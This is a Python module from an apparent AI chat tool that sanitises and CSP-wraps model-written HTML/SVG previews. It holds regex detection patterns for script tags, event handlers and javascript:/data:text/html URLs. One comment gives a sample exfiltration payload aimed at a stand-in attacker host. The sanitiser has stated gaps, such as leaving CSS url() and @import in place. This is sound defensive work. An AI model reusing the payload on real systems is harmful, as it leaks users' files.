"""可交互产物(Gen UI,v0.9.177)的**净化**这一半。

**要解决的问题**:学长写了一份 `.html` / `.svg`(图表、复盘页、给同学看的对比表),
以前只能在文件管理器里看见文件名,要点开才长得像东西。这一格让它**在聊天里就地显形**。

**为什么这一半是"删"而不是"框"**:界面那侧会用
`<iframe sandbox="">` 装这份东西 —— 那个档位下**浏览器本身就不执行脚本、不许可同源、
不许可顶栏跳转**,所以理论上不必再净化。但只靠它有两个洞:①`srcdoc` 的解析在旧内核 /
WebView2 的某些档位上不完全一致,②"没有回写通道"这件事不该只由一个 HTML 属性保证
(这个仓库的规矩是**同一件事两处都立闸**,与 `_upd_public` 那道"绝对路径不外流"同理)。
所以这里先删一遍,界面再沙一次。

删的清单(每一条都要**如实报数**,不许静默删):
- `<script>` 整段连正文;
- `<iframe|frame|object|embed|link|base|form>` 整段的**开标签**(这些元素的危害来自
  元素本身,不是内容,拆了标签就废了);
- `<meta http-equiv="refresh">`;
- 任何 `on*=` 事件属性(SVG 的 XSS 主流向量就是 `onload=`);
- `href/src` 里的 `javascript:` / `vbscript:` / `data:text/html`(先解 HTML 实体再判,
  否则 `&#106;avascript:` 会骗过字面比较)。

**它不是"安全渲染器"的四条边界**(写清楚免得被当成缺陷):
- 不判 CSS 里的东西(`url()` 外联、`@import` 会照原样留着)—— 沙箱里外联图片仍然
  出网,要断网请看界面那条 `update_check` 同级的口径,不在这一格。
- 不改写正文文本:它删的是**结构与属性**,不是"这段写得不好"。
- 只处理文本形态的 html/svg:`.exe`、二进制、超过上限的一律**拒**,而不是截断了装像完整。
- 路径只在工作区里解析(与 `get_asset` 同一条 `_within` 口径),不给绝对路径开门。
"""
from __future__ import annotations

import difflib
import html as _html
import re
import secrets

PANEL_MAX_BYTES = 512 * 1024      # 超过就不渲染:一张 1 MB 的表在聊天里没人看得完
PANEL_EXTS = (".html", ".htm", ".svg")
# Office 产物走**文字预览**(不是版式):docx 段落/表格、pptx 幻灯片/形状、
# xlsx 工作表/行。源文件可以比 HTML 大,但预览块有上限(见 office_preview.py)。
OFFICE_EXTS = (".docx", ".pptx", ".xlsx")
OFFICE_MAX_BYTES = 20 * 1024 * 1024

# 会被整段拆掉开标签的元素:危害来自元素本身(能引外部脚本、能发请求、能改基址)
_RISKY_TAGS = ("iframe", "frame", "object", "embed", "link", "base", "form")

_SCRIPT_BLOCK = re.compile(r"<script\b[^>]*>.*?</script>\s*",
                           re.IGNORECASE | re.DOTALL)
# 上头那条要求**闭合标签**;这种"没有结尾的 <script>"单独拆掉开标签,
# 否则把闭合那份去掉后,剩下的半截会把后面所有正文都当成脚本文本吞进去显示不出来。
_SCRIPT_OPEN = re.compile(r"<script\b[^>]*/?>(?:</script>)?", re.IGNORECASE)
_SCRIPT_SELF = re.compile(r"<script\b[^>]*/>", re.IGNORECASE)
_RISKY_OPEN = re.compile(r"</?\s*(?:%s)\b[^>]*>" % "|".join(_RISKY_TAGS),
                         re.IGNORECASE)
_META_REFRESH = re.compile(
    r"<meta\b[^>]*http-equiv\s*=\s*[\"']?\s*refresh\b[^>]*>", re.IGNORECASE)
# on* 属性:值可以是双引号、单引号或裸字(HTML 允许),三种都要吃到
_ON_ATTR = re.compile(
    r"""\son[a-z0-9_.:-]+\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+)""", re.IGNORECASE)
# 会带 URL 的属性:三种引号形状都要吃到**整个值**,再判它是不是可执行 scheme ——
# 只匹配"到冒号为止"会留下后半截(而且 `data:text/html;base64,…` 那种根本没有第二个
# 冒号,按"scheme:"去配就漏掉了)。值先解一层 HTML 实体再判:浏览器就是先解再判的。
_URL_ATTR = re.compile(
    r"""(\s(?:href|src|xlink:href|action|formaction|background|data|to)\s*=\s*)"""
    r"""(?:"([^"]*)"|'([^']*)'|([^\s"\'>]+))""", re.IGNORECASE)
_ENTITY_PREFIX = re.compile(r"^(?:\s|&(?:#\w+|\w+);)*", re.IGNORECASE)
_BAD_SCHEME = re.compile(
    r"^(?:javascript|vbscript|livescript)\s*:|^data:\s*text/html", re.IGNORECASE)


def looks_like_panel(path: str) -> bool:
    """这个路径值不值得走 HTML/SVG 那一格(只看扩展名,判定留给 read_and_sanitize)。"""
    low = str(path or "").strip().lower()
    return low.endswith(PANEL_EXTS)


def looks_like_artifact(path: str) -> bool:
    """产物卡认哪些文件:HTML/SVG 走净化预览,Office 走文字预览。"""
    low = str(path or "").strip().lower()
    return low.endswith(PANEL_EXTS) or low.endswith(OFFICE_EXTS)


def sanitize(text: str) -> "tuple[str, dict]":
    """删掉可执行的结构,回 (干净的正文, 各删了几处)。

    **计数是这一只手存在的理由之一**:调用方要能说"这张表原样能显示,只是我拆了
    两处脚本",而不是"显示不出来不知道为什么"。
    """
    counts = {"script": 0, "tag": 0, "meta_refresh": 0, "on_attr": 0, "scheme": 0}
    if not text:
        return "", counts
    body = text
    # 1. `<script>`:先按"成对"删(连正文一起),再把剩下来的散标签拆掉
    body, n = _SCRIPT_BLOCK.subn("", body)
    counts["script"] += n
    body, n = _SCRIPT_SELF.subn("", body)
    counts["script"] += n
    body, n = _SCRIPT_OPEN.subn("", body)
    counts["script"] += n
    # 2. 危险元素的开/闭标签(闭标签留着无害,但一起拆掉更省事)
    body, n = _RISKY_OPEN.subn("", body)
    counts["tag"] += n
    body, n = _META_REFRESH.subn("", body)
    counts["meta_refresh"] += n
    # 3. 事件属性
    body, n = _ON_ATTR.subn("", body)
    counts["on_attr"] += n
    # 4. 危险 scheme:**先解 HTML 实体再判**(浏览器就是先解再判的,反过来的话
    #    `&#106;avascript:` 会躲过字面比较而照样执行),判中就把整条值换成 "#"
    def _defuse(m: "re.Match") -> str:
        head = m.group(1)
        raw = m.group(2) or m.group(3) or m.group(4) or ""
        decoded = _html.unescape(raw).lstrip().lower()
        if not _BAD_SCHEME.match(decoded):
            return m.group(0)
        counts["scheme"] += 1
        return head + '"#"'
    body = _URL_ATTR.sub(_defuse, body)
    return body, counts


def stripped_note(counts: dict) -> str:
    """把计数说成一句人话;什么都没删就回空串(别为一件不存在的事道歉)。"""
    hit = [k for k, v in counts.items() if v]
    if not hit:
        return ""
    label = {"script": "脚本", "tag": "外部结构标签", "meta_refresh": "自动跳转",
             "on_attr": "事件属性", "scheme": "可执行链接"}
    return "就地显示前拆掉了:" + "、".join(
        f"{label[k]} {counts[k]} 处" for k in hit) + "(这份是工具写下的文本,不当代码执行)"


def text_content(body: str) -> str:
    """把净化后的 HTML/SVG 正文压成可比较的纯文本行(跳过脚本/样式)。"""
    src = re.sub(r"<(script|style)\b[^>]*>.*?</\1>", "", body or "",
                 flags=re.IGNORECASE | re.DOTALL)
    src = re.sub(r"<[^>]+>", "\n", src)
    src = _html.unescape(src)
    return "\n".join(line.strip() for line in src.splitlines() if line.strip())


def text_diff(old: str, new: str, limit: int = 40) -> dict:
    """HTML/SVG 的逐行差异。只做展示,不改正文、不执行任何东西。"""
    old_lines = str(old or "").splitlines()
    new_lines = str(new or "").splitlines()
    sm = difflib.SequenceMatcher(None, old_lines, new_lines)
    changes: list[dict] = []
    counts = {"changed": 0, "added": 0, "removed": 0}

    def add(kind: str, old_text: str = "", new_text: str = "") -> None:
        counts[kind] += 1
        if len(changes) < limit:
            changes.append({"type": kind, "id": "",
                            "old": str(old_text)[:300],
                            "new": str(new_text)[:300]})

    for tag, i1, i2, j1, j2 in sm.get_opcodes():
        if tag == "equal":
            continue
        if tag == "replace":
            pairs = min(i2 - i1, j2 - j1)
            for k in range(pairs):
                add("changed", old_lines[i1 + k], new_lines[j1 + k])
            for k in range(i1 + pairs, i2):
                add("removed", old_lines[k], "")
            for k in range(j1 + pairs, j2):
                add("added", "", new_lines[k])
        elif tag == "delete":
            for k in range(i1, i2):
                add("removed", old_lines[k], "")
        elif tag == "insert":
            for k in range(j1, j2):
                add("added", "", new_lines[k])
    total = sum(counts.values())
    summary = ("两版文字一样" if total == 0 else
               f"共 {total} 处文字变化（改 {counts['changed']} / "
               f"增 {counts['added']} / 删 {counts['removed']}）")
    return {"kind": "text", "summary": summary, "changes": changes,
            "counts": counts, "truncated": max(0, total - limit)}


def read_and_sanitize(raw: bytes) -> "tuple[str, dict, str]":
    """字节 → (干净正文, 删了什么, 实话)。超限 / 解不开一律拒,不截断了装像完整。"""
    if len(raw) > PANEL_MAX_BYTES:
        return "", {}, (f"这份有 {len(raw) / 1024:.0f} KB,超过就地显示的上限 "
                        f"{PANEL_MAX_BYTES // 1024} KB —— 请在文件里打开看")
    try:
        text = raw.decode("utf-8")
    except UnicodeDecodeError:
        try:
            text = raw.decode("gbk")
        except UnicodeDecodeError:
            return "", {}, "这不是 UTF-8/GBK 文本,不按网页渲染"
    body, counts = sanitize(text)
    return body, counts, ""


# 就地显示时**由我们**注入的那一条 CSP。它和界面的 `<iframe sandbox>` 是两道独立
# 的闸(沙箱断"脚本能不能跑、能不能攀回宿主",这条断"能不能往外要东西"),
# 少了它有一份 html 就能用 `<img src="http://_attacker/…#<正文>">` 或 `@import`
# 把本机文件的内容与局域网探到外网去 —— 本地优先的立场不允许这一步出网。
# `style-src 'unsafe-inline'` 是**故意留的**:表要好看就得靠内联样式,而样式本身
# 在这个档位下执行不了代码。
CSP_META = ('<meta http-equiv="Content-Security-Policy" content="'
            "default-src 'none'; style-src 'unsafe-inline'; "
            "img-src data: blob:; font-src data:; media-src 'none'; "
            "form-action 'none'; frame-src 'none'; object-src 'none'"
            '">')


def wrap_document(body: str, kind: str) -> str:
    """把净化过的正文装进一份**带 CSP 的**独立文档。

    SVG 单独一份文件时 `<meta http-equiv>` 是不生效的(SVG 没有 HTML 那个头部语义),
    所以两种都套 HTML 壳 —— 顺带把"整页黑底/无边距"这类观感问题也统一了。
    """
    head = CSP_META + '<meta charset="utf-8">'
    if kind == "svg":
        return ("<!doctype html><html><head>" + head
                + "<style>html,body{margin:0;padding:0;background:transparent;"
                  "color-scheme:light dark}svg{display:block;max-width:100%}</style>"
                "</head><body>" + body + "</body></html>")
    # 正文自己已经带了 <!doctype>/<head> 也不再拆它:CSP 排在**最前面**,
    # 浏览器只认第一份 doctype,后面那份会被忽略而不会顶掉我们这条。
    return head + body


# ---------------------------------------------------------------- 批注模式
# 预览那份是"不执行任何东西";批注这份要**执行一段我们自己的脚本**,所以另开一条:
# 模型写的脚本仍然先被 `sanitize` 删掉,只放行带 nonce 的注入脚本。沙箱侧只给
# `allow-scripts`、不给 `allow-same-origin` —— 它拿不到宿主 DOM/Cookie,也读不到
# 自己的源;唯一出口是 `parent.postMessage`。CSP 也只放行这个 nonce + 内联样式,
# 出网仍然全拒。
ANNOTATION_CSS = (
    "#ann-hint{position:fixed;left:12px;bottom:12px;z-index:2147483647;"
    "font:12px/1.5 'Microsoft YaHei',system-ui,sans-serif;color:#0b1720;"
    "background:rgba(255,255,255,.94);border:1px solid #3FBDAE;"
    "border-radius:999px;padding:5px 11px;box-shadow:0 4px 14px rgba(0,0,0,.12);"
    "pointer-events:none;}"
    "::selection{background:rgba(63,189,174,.35);}"
)

ANNOTATION_SCRIPT = r"""
(function () {
  "use strict";
  var picked = null;
  var suppressClick = 0;
  function pathOf(el) {
    var parts = [];
    while (el && el.nodeType === 1 && parts.length < 6) {
      var part = el.tagName.toLowerCase();
      if (el.id) { part += "#" + el.id; parts.unshift(part); break; }
      var cls = (el.getAttribute("class") || "").split(/\s+/).filter(Boolean).slice(0, 2);
      if (cls.length) part += "." + cls.join(".");
      var p = el.parentElement;
      if (p) {
        var i = Array.prototype.indexOf.call(p.children, el) + 1;
        part += ":nth-child(" + i + ")";
      }
      parts.unshift(part);
      el = p;
    }
    return parts.join(" > ");
  }
  function post(type, payload) {
    try {
      parent.postMessage(Object.assign({ type: type }, payload || {}), "*");
    } catch (e) { /* 宿主没接也不该把页面弄坏 */ }
  }
  function snippet(el) {
    var t = el ? (el.innerText || el.textContent || "") : "";
    return t.replace(/\s+/g, " ").trim().slice(0, 500);
  }
  // Office 文字预览给每个段落/单元格/页/行挂了 data-block;取最近的那个祖先。
  function blockOf(el) {
    while (el && el !== document.body) {
      if (el.getAttribute) {
        var b = el.getAttribute("data-block");
        if (b) return b;
      }
      el = el.parentElement;
    }
    return "";
  }
  function pick(el) {
    if (picked && picked !== el) {
      picked.style.outline = picked.getAttribute("data-ann-outline") || "";
      picked.style.outlineOffset = "";
    }
    picked = el;
    if (!el) return;
    if (!el.hasAttribute("data-ann-outline")) {
      el.setAttribute("data-ann-outline", el.style.outline || "");
    }
    el.style.outline = "2px solid #3FBDAE";
    el.style.outlineOffset = "2px";
  }
  function ready() {
    if (document.getElementById("ann-hint")) return;
    var hint = document.createElement("div");
    hint.id = "ann-hint";
    hint.textContent = "批注模式：选中文字，或点一个元素";
    if (document.body) document.body.appendChild(hint);
    post("ann-ready", {});
  }
  document.addEventListener("mouseup", function () {
    var sel = window.getSelection ? window.getSelection() : null;
    var text = sel ? String(sel.toString() || "").replace(/\s+/g, " ").trim() : "";
    if (!text) return;
    var node = sel.anchorNode;
    var el = node ? (node.nodeType === 1 ? node : node.parentElement) : null;
    pick(el);
    suppressClick = Date.now() + 350;
    post("ann-select", {
      mode: "text", text: text.slice(0, 500),
      selector: pathOf(el), tag: el ? el.tagName.toLowerCase() : "",
      block: blockOf(el)
    });
  }, true);
  document.addEventListener("click", function (ev) {
    var t = ev.target;
    if (!t || t.nodeType !== 1) return;
    if (t.closest && t.closest("#ann-hint")) return;
    if (Date.now() < suppressClick) { ev.preventDefault(); return; }
    ev.preventDefault();
    pick(t);
    post("ann-select", {
      mode: "element", text: snippet(t),
      selector: pathOf(t), tag: t.tagName.toLowerCase(),
      block: blockOf(t)
    });
  }, true);
  document.addEventListener("keydown", function (ev) {
    if (ev.key === "Escape") post("ann-cancel", {});
  }, true);
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", ready);
  } else {
    ready();
  }
})();
"""


INTERACTIVE_CSP = (
    "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; "
    "img-src data: blob:; font-src data:; media-src data: blob:; "
    "connect-src 'none'; worker-src 'none'; form-action 'none'; "
    "frame-src 'none'; object-src 'none'; base-uri 'none'; navigate-to 'none'"
)


def wrap_interactive(raw: str) -> str:
    """交互版:模型写的 HTML/JS **原样保留**,只加 CSP 与 charset。

    与预览/批注不同,这里不能再删脚本 —— 删了就没有"拖动会变"这回事。
    这是一格**用户显式点「运行」才进入**的信任层,边界由三样东西共同守:
    - 界面沙箱 `allow-scripts`:不给同源、弹窗、表单、下载、顶层跳转;
    - 这条 CSP:只允许 inline 脚本/样式;外链脚本、fetch/XHR、worker、外图全拒;
    - 前端**不接**它的 postMessage(父页只认批注 iframe 那条)。

    已知不挡的:iframe 自己导航到某个 URL(Chromium 不支持 navigate-to 的强制);
    同步死循环会占 CPU。这两条在 SECURITY.md 里写明,系统提示词也要求模型别写死循环。
    """
    raw = _META_REFRESH.sub("", str(raw or ""))   # 防止被 meta refresh 自己跳走
    head = ('<meta http-equiv="Content-Security-Policy" content="'
            + INTERACTIVE_CSP + '"><meta charset="utf-8">')
    return head + raw


def wrap_annotatable(body: str, kind: str) -> str:
    """把**已净化**的正文装进可批注文档。

    `body` 必须已经过 `sanitize`/`read_and_sanitize`;这个函数只负责加 CSP、
    套壳、注入受信脚本。CSP 用 nonce 只放行**这一条**脚本:模型即使留下了
    一段 `<script>`,它没有 nonce 也跑不起来(净化那一层本来也会删掉它)。
    """
    nonce = secrets.token_hex(12)
    csp = ("default-src 'none'; style-src 'unsafe-inline'; "
           f"script-src 'nonce-{nonce}'; img-src data: blob:; font-src data:; "
           "media-src 'none'; form-action 'none'; frame-src 'none'; "
           "object-src 'none'; base-uri 'none'")
    head = (f'<meta http-equiv="Content-Security-Policy" content="{csp}">'
            '<meta charset="utf-8"><style>' + ANNOTATION_CSS + '</style>')
    script = f'<script nonce="{nonce}">{ANNOTATION_SCRIPT}</script>'
    if kind == "svg":
        return ("<!doctype html><html><head>" + head + "</head><body>"
                + body + script + "</body></html>")
    low = body.lower()
    if "</body>" in low:
        # 插在最后一个 </body> 之前:脚本在解析时就在,不等 DOMContentLoaded 也行。
        i = low.rfind("</body>")
        return head + body[:i] + script + body[i:]
    return head + body + script
